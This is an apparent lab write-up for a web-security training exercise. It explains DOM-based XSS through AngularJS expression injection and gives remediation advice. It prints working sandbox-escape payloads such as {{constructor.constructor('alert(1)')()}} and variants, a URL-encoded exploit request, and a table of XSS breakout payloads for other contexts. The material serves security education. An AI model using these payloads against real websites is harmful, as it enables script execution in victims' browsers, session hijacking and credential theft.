# Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

**Category:** Cross-Site Scripting (XSS)\
**Difficulty:** Practitioner\
**Objective:** Execute an AngularJS expression that calls the `alert()` function.

## 0. Attacker mindset

When an application uses AngularJS (an older but still widely used JavaScript framework), the normal XSS approach of injecting `<script>` tags or HTML event handlers won't work if angle brackets and quotes are encoded. However, AngularJS evaluates **expressions inside double curly braces** `{{ }}` directly as JavaScript. If an attacker can inject an AngularJS expression, they can execute arbitrary JavaScript without using `<`, `>`, or `"`.

The key is recognizing AngularJS usage via the `ng-app` directive in the HTML source.

## 1. What is the vulnerability?

The application includes AngularJS and uses the `ng-app` directive to bootstrap it:

```html
<body ng-app>
```

The search functionality reflects user input directly into the page **within an AngularJS context**. Because AngularJS evaluates expressions inside `{{ }}`, an attacker can inject something like:

```javascript
{{constructor.constructor('alert(1)')()}}
```

Angle brackets and double quotes are HTML-encoded, but that doesn't matter - the payload never uses them.

### How AngularJS Expressions Work

AngularJS evaluates anything inside `{{ }}` as JavaScript expressions:

| Input | Output |
|-------|--------|
| `{{'hello'}}` | `hello` |
| `{{5+3}}` | `8` |
| `{{alert(1)}}` | **Executes JavaScript** |

## 2. How did I exploit it?

### Discovery

First, viewed the page source to identify if AngularJS was present. Looked for the `ng-app` directive:

```html
<body ng-app>
```

This confirmed AngularJS was active and evaluating expressions.

### Code Analysis

The search parameter value is reflected somewhere inside the AngularJS context. The exact location doesn't matter - any AngularJS expression inside `{{ }}` will be evaluated.

### The Payload

**Final payload:**
```javascript
{{constructor.constructor('alert(1)')()}}
```

**URL encoded:**
```
/?search=%7B%7Bconstructor.constructor%28%27alert%281%29%27%29%28%29%7D%7D
```

### Why It Works

AngularJS uses JavaScript's `constructor` property to access the `Function` constructor:

| Step | Code | What it does |
|------|------|--------------|
| 1 | `constructor` | References `Object.constructor` (the Function constructor) |
| 2 | `.constructor('alert(1)')` | Creates a new function with body `alert(1)` |
| 3 | `()` | Executes the newly created function |

In older AngularJS versions, the sandbox that restricted access to `window` could be bypassed this way.

### Alternative Payloads (PortSwigger Solution)

```javascript
{{$on.constructor('alert(1)')()}}
```

This uses the `$on` scope property instead of the global `constructor`.

### Other Known AngularJS Payloads

| Payload | Notes |
|---------|-------|
| `{{constructor.constructor('alert(1)')()}}` | Classic |
| `{{$on.constructor('alert(1)')()}}` | Uses scope |
| `{{'a'.constructor.prototype.charAt=[].join;$eval('alert(1)')}}` | More complex |

## 3. Impact

- Arbitrary JavaScript execution in the victim's browser
- Bypasses HTML encoding of angle brackets and quotes
- Can lead to session hijacking, credential theft, or defacement
- The payload executes automatically when the page loads (no user interaction)

## 4. How can it be fixed?

- **Update AngularJS** to a patched version (1.6+ has better sandboxing, but sandbox was removed in later versions because it was never truly secure)
- **Avoid reflecting user input** inside AngularJS contexts
- **Use Content Security Policy (CSP)** to restrict script execution
- **Sanitize user input** before displaying it, even in AngularJS contexts
- **Consider migrating to a modern framework** (Angular 2+ does not have this sandbox escape issue)

### Better yet:

AngularJS team eventually **removed the sandbox entirely** because it gave a false sense of security. The real fix is:

```javascript
// DO NOT reflect user input at all
// Use proper escaping or safe APIs
```

---

## Key Insight: Different Contexts Require Different Payloads

| Lab | Context | Technique |
|-----|---------|-----------|
| Lab 7 | HTML attribute | `" onmouseover="alert(1)"` |
| Lab 9 | JavaScript string | `';alert(1);//` |
| Lab 10 | Inside `<select>` | `</select><script>` |
| **Lab 11** | AngularJS | `{{constructor.constructor('alert(1)')()}}` |

The same encoding protection (angle brackets + quotes) fails in AngularJS because AngularJS evaluates expressions directly - no HTML tags or quotes needed.

---

## How to Identify AngularJS

Look for these signs in the page source:

```html
<script src="angular.js"></script>
<body ng-app>
<div ng-controller="...">
{{ some_expression }}
```

If `ng-app` is present, the page uses AngularJS and evaluates `{{ }}` expressions.

---

**MITRE ATT&CK:** [T1189 - Drive-by Compromise](https://attack.mitre.org/techniques/T1189/)